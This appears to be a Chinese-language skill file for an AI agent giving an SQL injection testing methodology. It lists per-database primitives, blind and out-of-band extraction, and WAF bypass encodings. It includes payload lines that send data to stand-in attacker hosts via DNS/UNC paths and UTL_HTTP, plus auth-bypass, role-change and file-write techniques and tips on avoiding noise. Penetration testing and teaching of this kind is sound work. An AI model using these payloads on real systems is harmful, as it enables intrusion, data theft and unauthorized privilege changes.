---
name: sql-injection
description: SQL 注入安全测试技能，覆盖联合查询、盲注、报错注入和 ORM 绕过
---

# SQL 注入

SQL 注入仍然是最持久、影响最大的漏洞类型之一。现代利用重点关注解析器差异、ORM/查询构建器边界、JSON/XML/CTE/JSONB 攻击面、带外外传以及隐蔽的盲注通道。凡是进入 SQL 的字符串拼接，都应视为可疑。

## 攻击面

**数据库**
- 经典关系型：MySQL/MariaDB、PostgreSQL、MSSQL、Oracle
- 新型攻击面：JSON/JSONB 操作符、全文/搜索、地理空间、窗口函数、CTE、lateral joins

**集成路径**
- ORM、查询构建器、存储过程
- 搜索服务、报表/导出器

**输入位置**
- 路径/query/body/header/cookie
- 混合编码（URL、JSON、XML、multipart）
- 标识符与值：表/列名（需要引用/转义）与字面量（需要引号/CAST）
- 查询构建器：`whereRaw`/`orderByRaw`，ORM 中的字符串模板
- JSON 强制转换或数组包含操作符
- 直接嵌入过滤条件的批量/批处理端点与报表生成器

## 检测通道

**基于错误**
- 触发类型/约束/解析错误，暴露堆栈、版本或路径

**基于布尔**
- 仅在谓词真假上不同的成对请求
- 比较状态码/响应体/长度/ETag 差异

**基于时间**
- `SLEEP`/`pg_sleep`/`WAITFOR`
- 使用子查询门控避免全局延迟噪声

**带外（OAST）**
- 通过数据库特定原语触发 DNS/HTTP 回调

## DBMS 原语

### MySQL

- 版本/用户/数据库：`@@version`、`database()`、`user()`、`current_user()`
- 基于错误：`extractvalue()`/`updatexml()`（旧版）、用于构造错误的 JSON 函数
- 文件 IO：`LOAD_FILE()`、`SELECT ... INTO DUMPFILE/OUTFILE`（需要 FILE 权限与 secure_file_priv）
- OOB/DNS：`LOAD_FILE(CONCAT('\\\\',database(),'.attacker.com\\a'))`
- 时间：`SLEEP(n)`、`BENCHMARK`
- JSON：使用精心构造路径的 `JSON_EXTRACT`/`JSON_SEARCH`；GIS 函数有时也会泄露

### PostgreSQL

- 版本/用户/数据库：`version()`、`current_user`、`current_database()`
- 基于错误：通过不支持的类型转换或除零触发异常；xml2 中的 `xpath()` 错误
- OOB：`COPY (program ...)` 或 dblink/外部数据包装器（启用时）；HTTP 扩展
- 时间：`pg_sleep(n)`
- 文件：`COPY table TO/FROM '/path'`（需要 superuser），`lo_import`/`lo_export`
- JSON/JSONB：使用 `->`、`->>`、`@>`、`?|` 等操作符，并结合 lateral/CTE 做盲提取

### MSSQL

- 版本/数据库/用户：`@@version`、`db_name()`、`system_user`、`user_name()`
- OOB/DNS：`xp_dirtree`、`xp_fileexist`；如果启用，可通过 OLE 自动化（`sp_OACreate`）发起 HTTP
- 执行：`xp_cmdshell`（通常被禁用）、`OPENROWSET`/`OPENDATASOURCE`
- 时间：`WAITFOR DELAY '0:0:5'`；重函数会产生可测延迟
- 基于错误：转换/解析、除零、`FOR XML PATH` 泄露

### Oracle

- 版本/数据库/用户：来自 `v$version` 的 banner、`ora_database_name`、`user`
- OOB：`UTL_HTTP`/`DBMS_LDAP`/`UTL_INADDR`/`HTTPURITYPE`（取决于权限）
- 时间：`dbms_lock.sleep(n)`
- 基于错误：`to_number`/`to_date` 转换、`XMLType`
- 文件：使用目录对象的 `UTL_FILE`（需要特权）

## 关键漏洞

### 基于 UNION 的提取

- 通过 `ORDER BY n` 和 `UNION SELECT null,...` 确定列数与列类型
- 使用 `CAST`/`CONVERT` 对齐类型；必要时强制转为 text/json 以便渲染
- 当 UNION 被过滤时，切换到基于错误或盲注的通道

### 盲注提取

- 使用 `SUBSTRING`/`ASCII`、`LEFT`/`RIGHT` 或 JSON/数组操作符对单比特谓词分支
- 在字符空间上做二分搜索以减少请求次数
- 对输出做编码（hex/base64）以便归一化
- 在子查询中加入门控延迟以减少噪声：`AND (SELECT CASE WHEN (predicate) THEN pg_sleep(0.5) ELSE 0 END)`

### 带外通道

- 优先使用 OAST 以减少噪声并绕过严格的响应路径
- 将数据嵌入 DNS 标签或 HTTP 查询参数
- MSSQL：`xp_dirtree \\\\<data>.attacker.tld\\a`
- Oracle：`UTL_HTTP.REQUEST('http://<data>.attacker')`
- MySQL：使用 UNC 路径的 `LOAD_FILE`

### 写入原语

- 认证绕过：向登录检查中注入基于 OR 的恒真条件或子查询
- 权限变更：当 UPDATE 可注入时修改角色/套餐/功能标志
- 文件写入：`INTO OUTFILE`/`DUMPFILE`、`COPY TO`、`xp_cmdshell` 重定向
- 任务/存储过程滥用：在权限允许时调度任务或创建过程/函数

### ORM 与查询构建器

- 危险 API：`whereRaw`/`orderByRaw`，向 LIKE/IN/ORDER 子句中插入字符串
- 当用户输入被插入到标识符中时，可通过标识符引用（表/列名）实现注入
- ORM 暴露的 JSON 包含操作符（如 PostgreSQL 的 `@>`）配合原始片段
- 参数不匹配：仅部分参数化，操作符或列表仍未绑定（`IN (...)`）

### 非常见上下文

- 在 ORDER BY/GROUP BY/HAVING 中使用 `CASE WHEN` 形成布尔通道
- LIMIT/OFFSET：向 OFFSET 注入以产生可测的时间或页面形态变化
- 全文/搜索辅助函数：`MATCH AGAINST`、`to_tsvector`/`to_tsquery`，混合载荷使用
- XML/JSON 函数：通过畸形文档/路径生成错误

## 绕过技巧

**空白/间距**
- `/**/`、`/**/!00000`、注释、换行、制表符
- `0xe3 0x80 0x80`（全角空格）

**关键字拆分**
- `UN/**/ION`、`U%4eION`、反引号/引号、大小写折叠

**数字技巧**
- 科学计数法、有符号/无符号、十六进制（`0x61646d696e`）

**编码**
- 双重 URL 编码、混合 Unicode 规范化（NFKC/NFD）
- 使用 `char()`/`CONCAT_ws` 构造 token

**子句迁移**
- 使用子查询、派生表、CTE（`WITH`）和 lateral joins 隐藏载荷形态

## 测试方法

1. **识别查询形态** - SELECT/INSERT/UPDATE/DELETE，是否存在 WHERE/ORDER/GROUP/LIMIT/OFFSET
2. **判断输入影响** - 用户输入位于标识符还是值中
3. **确认注入类型** - 反射错误、布尔差异、时间差异或带外回调
4. **选择最安静的判定器** - 优先使用基于错误或布尔的通道，而不是嘈杂的时间盲注
5. **建立提取通道** - UNION（如果可见）、基于错误、布尔位提取、基于时间或 OAST/DNS
6. **切换到元数据** - 版本、当前用户、数据库名
7. **瞄准高价值表** - 认证绕过、角色变更、文件系统访问（如果可行）

## 验证

1. 展示可靠的判定器（错误/布尔/时间/OAST），并通过切换谓词证明控制能力
2. 使用已建立的通道提取可验证的元数据（版本、当前用户、数据库名）
3. 在合法范围内检索或修改一个非平凡目标（表行、角色标志）
4. 提供可复现的请求，并确保差异只存在于注入片段
5. 在适用时展示纵深防御绕过（WAF 开启后仍可通过变体利用）

## 误报

- 与 SQL 解析或约束无关的通用错误
- 由模板而非谓词真假导致的固定响应长度
- 与注入函数调用无关的网络/CPU 人为延迟
- 经过代码审查确认、没有字符串拼接的参数化查询

## 影响

- 直接数据外传以及隐私/合规暴露
- 通过操控谓词实现认证与授权绕过
- 服务端文件访问或命令执行（取决于平台和权限）
- 通过修改数据、任务或存储过程造成持久性供应链影响

## 实战技巧

1. 先选择最安静且可靠的判定器；避免冗长而嘈杂的 sleep
2. 归一化响应（长度/ETag/digest），降低 diff 时的波动
3. 先拿元数据，再直接跳到业务关键表；尽量减少横向噪声
4. 当 UNION 失败时，切换到基于错误或盲注的位提取；有 OAST 时优先使用
5. 把 ORM 当作薄包装：原始片段常常会漏过去；重点审计 `whereRaw`/`orderByRaw`
6. 当过滤器阻断直接 SELECT 时，使用 CTE/派生表藏匿表达式
7. 利用 PostgreSQL 的 JSON/JSONB 操作符和 MySQL 的 JSON 函数作为侧信道
8. 保持载荷可移植；维护各 DBMS 的函数与类型字典
9. 通过负面测试和代码审查验证缓解措施；正确参数化操作符/列表
10. 记录精确的查询形态；防护必须匹配查询构造方式，而不是凭假设

## 总结

SQL 注入仍然是最持久、影响最大的漏洞类型之一。它往往在授权逻辑与查询构造偏离预期时成功。请在所有地方绑定参数，避免动态标识符，并在用户输入真正进入 SQL 的精确边界做验证。
